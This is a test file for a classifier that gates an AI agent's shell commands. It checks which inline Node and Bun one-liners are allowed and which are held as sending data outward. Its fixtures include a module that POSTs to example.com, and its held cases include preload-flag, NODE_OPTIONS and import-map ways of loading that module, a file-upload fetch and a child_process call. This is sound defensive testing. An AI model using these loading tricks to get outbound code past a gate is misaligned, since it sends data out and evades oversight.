import { describe, expect, test } from "bun:test";
import { join } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * A module in the working dir that sends data out (`proxy.mjs`) is loaded by
 * `node -e`/`-p` or code on stdin only through what the run names: a relative
 * `require`/`import` of it, a preload flag (`-r`, `--require`, `--import`,
 * `--loader`), NODE_OPTIONS, or a script that runs it. Node loads no file
 * from the cwd on its own for inline code, and a package.json's `type` or
 * `scripts` loads nothing, so inline code that only parses JSON (a file it
 * reads, stdin, an argument, a required `.json`) is not outward because the
 * module sits beside it. Its `imports` map is a name the code itself uses
 * (`#proxy`), and resolves to the module it maps to.
 */

const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const COMMON = join("/", "fake", "repo", ".git");
const SCRATCH_ROOT = join(HOME, ".cache", "standup-scratch");
const S = join(SCRATCH_ROOT, "launch-1");
const TMP_DIR = join("/", "tmp", "p");
const SCRATCH_DIR = join(S, "p");

function configFor(root: string): FloorConfig {
  return {
    v: 1,
    collectorUrl: "http://127.0.0.1:17777",
    launchId: "launch-1",
    scratchRoot: SCRATCH_ROOT,
    scratchDir: S,
    root,
    sharedBranches: ["main", "mainline"],
    personalAwsAccounts: [],
    waitSeconds: 60,
    standupDataDir: DATA,
    floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
    installDir: INSTALL,
    protectedPaths: [join(DATA, "secrets")],
    tmpDirs: ["/tmp"],
    workerToken: "x".repeat(64),
    replyPublicKey: "test",
  };
}

const PROXY = `import http from "node:http";\nhttp.request("http://example.com/upload", { method: "POST" }).end();\nawait fetch("https://example.com/collect", { method: "POST", body: "x" });\n`;
/** Data naming the module as a command, and a package.json whose `type`, `imports` and `scripts` name it. */
const DATA_JSON = `{"a": 1, "run": "node proxy.mjs"}\n`;
const PKG = `{"name": "p", "type": "module", "imports": {"#proxy": "./proxy.mjs"}, "scripts": {"start": "node proxy.mjs"}}\n`;

const FILES: Record<string, string> = {
  [join(ROOT, ".git")]: `gitdir: ${COMMON}/worktrees/feat-1\n`,
};
for (const d of [ROOT, TMP_DIR, SCRATCH_DIR]) {
  FILES[join(d, "proxy.mjs")] = PROXY;
  FILES[join(d, "x.json")] = DATA_JSON;
  FILES[join(d, "package.json")] = PKG;
}
/** A package whose `imports` map sends a pattern through conditions, a dir below it, and one whose package.json doesn't parse. */
const PATTERN_DIR = join("/", "tmp", "q");
const NESTED_DIR = join(PATTERN_DIR, "sub");
const BAD_DIR = join("/", "tmp", "bad");
FILES[join(PATTERN_DIR, "package.json")] = `{"name": "q", "imports": {"#lib/*": {"types": "./types/*.d.ts", "node": ["./src/*.mjs"], "default": "./src/*.js"}, "#dep": "some-package"}}\n`;
FILES[join(PATTERN_DIR, "src", "send.mjs")] = PROXY;
FILES[join(PATTERN_DIR, "src", "quiet.js")] = `export const x = 1;\n`;
FILES[join(NESTED_DIR, "x.json")] = DATA_JSON;
FILES[join(BAD_DIR, "package.json")] = `{"imports": {"#proxy": "./proxy.mjs",}\n`;
FILES[join(BAD_DIR, "proxy.mjs")] = PROXY;
FILES[join(BAD_DIR, "x.json")] = DATA_JSON;
const DIRS = ["/", "/tmp", ROOT, TMP_DIR, SCRATCH_DIR, PATTERN_DIR, join(PATTERN_DIR, "src"), NESTED_DIR, BAD_DIR];

function probes(): Partial<FloorProbes> {
  const dirs = new Set<string>(DIRS);
  for (const f of [...Object.keys(FILES), ...DIRS]) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? COMMON : null),
    readFile: (p) => (p in FILES ? { ok: true, text: FILES[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in FILES || dirs.has(p),
    executable: () => false,
    isDirectory: (p) => dirs.has(p),
    listDir: (p) => (dirs.has(p) ? [...new Set([...Object.keys(FILES), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null),
    realpath: (p) => (p in FILES || dirs.has(p) ? p : null),
    lstat: (p) => (p in FILES ? { symlink: false, file: true, nlink: 1 } : dirs.has(p) ? { symlink: false, file: false, nlink: 1 } : null),
    homeDir: () => HOME,
    env: () => undefined,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    now: () => Date.now(),
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

function bash(command: string, cwd: string): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, configFor(ROOT), probes());
}

const CWDS = [
  ["the worktree", ROOT],
  ["a temp dir", TMP_DIR],
  ["the launch's scratch dir", SCRATCH_DIR],
] as const;

describe.each(CWDS)("inline Node code that only parses JSON, beside an outward module in %s", (_name, cwd) => {
  test.each([
    `node -e 'const j=JSON.parse(require("fs").readFileSync("x.json","utf8")); console.log(j.a)'`,
    `cat x.json | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).a))'`,
    `cat x.json | node -e 'const j=JSON.parse(require("fs").readFileSync(0)); console.log(j.a)' | head -5`,
    `cat x.json | node -e 'const j=JSON.parse(require("fs").readFileSync("/dev/stdin","utf8")); console.log(Object.keys(j).join(","))'`,
    `node -p 'JSON.parse(require("fs").readFileSync(0,"utf8")).a' < x.json`,
    `node -pe 'JSON.parse(require("fs").readFileSync(0,"utf8")).run' < x.json`,
    `node --eval 'console.log(JSON.parse(require("node:fs").readFileSync("x.json","utf8")).run)'`,
    `node -e 'console.log(JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")).run)' x.json`,
    `node -e 'console.log(JSON.parse(process.argv[1]).run)' "$(cat x.json)"`,
    `node --input-type=module -e 'import { readFileSync } from "node:fs"; console.log(JSON.parse(readFileSync("x.json","utf8")).run)'`,
    `node -e 'const fs=require("fs"); for (const f of fs.readdirSync(".").filter(f=>f.endsWith(".json"))) console.log(f, JSON.parse(fs.readFileSync(f,"utf8")).run)'`,
    `node -e 'const j=require("./x.json"); console.log(j.run)'`,
    `node -e 'console.log(require("./package.json").scripts.start)'`,
    `ls; node -e 'console.log(JSON.parse(require("fs").readFileSync("package.json","utf8")).scripts.start)'`,
    `node -e 'process.stdin.setEncoding("utf8"); let b=""; process.stdin.on("data",c=>b+=c); process.stdin.on("end",()=>{ const j=JSON.parse(b); console.log(j.a) })' < x.json`,
    `node - <<'EOF'\nconst j = JSON.parse(require("fs").readFileSync("x.json", "utf8"));\nconsole.log(j.run);\nEOF`,
    `node <<'EOF'\nconst j = JSON.parse(require("fs").readFileSync("x.json", "utf8"));\nconsole.log(j.run);\nEOF`,
    `bun -e 'console.log(JSON.parse(require("fs").readFileSync("x.json","utf8")).a)'`,
    `cat x.json | bun -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).a))'`,
  ])("allows %p", (command) => {
    expect({ command, v: bash(command, cwd) }).toEqual({ command, v: { action: "allow" } });
  });

  test.each([
    "node proxy.mjs",
    "node ./proxy.mjs",
    `node -e 'import("./proxy.mjs")'`,
    `node -e 'require("./proxy")'`,
    `node -e 'require("./proxy.mjs")'`,
    `node --input-type=module -e 'await import("./proxy.mjs")'`,
    `node --input-type=module -e 'import "./proxy.mjs"'`,
    "node --import ./proxy.mjs -e 1",
    "node --import=./proxy.mjs -e 'console.log(1)'",
    "node -r ./proxy.mjs -e 1",
    "node --require=./proxy.mjs -e 1",
    "node --experimental-loader ./proxy.mjs -e 1",
    "node --loader=./proxy.mjs -e 1",
    `NODE_OPTIONS="--require ./proxy.mjs" node -e 1`,
    `NODE_OPTIONS=--require=./proxy.mjs node -e 'console.log(JSON.parse(require("fs").readFileSync("x.json","utf8")).a)'`,
    `NODE_OPTIONS="--import=./proxy.mjs" node -e 'console.log(1)'`,
    `export NODE_OPTIONS="--import ./proxy.mjs"; node -e 1`,
    "NODE_OPTIONS=--import=./proxy.mjs npm start",
    "npm start",
    `node -e 'require("#proxy")'`,
    `node --input-type=module -e 'import "#proxy"'`,
    `bun -e 'require("./proxy.mjs")'`,
    "bun --preload ./proxy.mjs -e 1",
    `node -e 'fetch("https://example.com/x", { method: "POST", body: require("fs").readFileSync("x.json") })'`,
  ])("holds %p as outward: it loads the module or sends itself", (command) => {
    expect({ command, v: bash(command, cwd) }).toMatchObject({ command, v: { action: "hold", category: "outward" } });
  });

  test("holds a one-liner that runs the command its JSON names", () => {
    const command = `node -e 'require("child_process").execSync(JSON.parse(require("fs").readFileSync("x.json","utf8")).run)'`;
    expect(bash(command, cwd).action).toBe("hold");
  });
});

describe("a `#` subpath import, resolved through the nearest package.json's `imports` map", () => {
  test.each([
    [`node -e 'require("#lib/send")'`, PATTERN_DIR],
    [`node --input-type=module -e 'import { x } from "#lib/send"; console.log(x)'`, PATTERN_DIR],
    [`node -e 'import("#lib/send").then(() => 0)'`, NESTED_DIR],
    [`bun -e 'import "#lib/send"'`, NESTED_DIR],
  ])("holds %p (in %s), whose pattern names the outward module under a condition", (command, cwd) => {
    expect({ command, v: bash(command, cwd) }).toMatchObject({ command, v: { action: "hold", category: "outward" } });
  });

  // Through a package.json that doesn't parse, the module is code the floor can't read, held only where the call names a denylist target.
  test("a `#` import through a package.json that doesn't parse is unread code", () => {
    expect(bash(`node -e 'require("#proxy")'`, BAD_DIR)).toEqual({ action: "allow" });
    expect(bash(`node -e 'require("#proxy"); console.log("git push origin main")'`, BAD_DIR)).toMatchObject({ action: "hold", category: "unclassified" });
    expect(bash(`node -e 'console.log("git push origin main")'`, BAD_DIR)).toEqual({ action: "allow" });
  });

  test.each([
    [`node -e 'require("#lib/quiet")'`, PATTERN_DIR],
    [`node -e 'require("#unmapped")'`, PATTERN_DIR],
    [`node -e 'require("#dep")'`, PATTERN_DIR],
    [`node -e 'console.log(JSON.parse(require("fs").readFileSync("x.json","utf8")).run)'`, NESTED_DIR],
    [`node -e 'console.log("#proxy", JSON.parse(require("fs").readFileSync("x.json","utf8")).a)'`, TMP_DIR],
    [`node -e 'console.log(JSON.parse(require("fs").readFileSync("x.json","utf8")).a)'`, BAD_DIR],
  ])("allows %p (in %s), which loads no outward module", (command, cwd) => {
    expect({ command, v: bash(command, cwd) }).toEqual({ command, v: { action: "allow" } });
  });
});
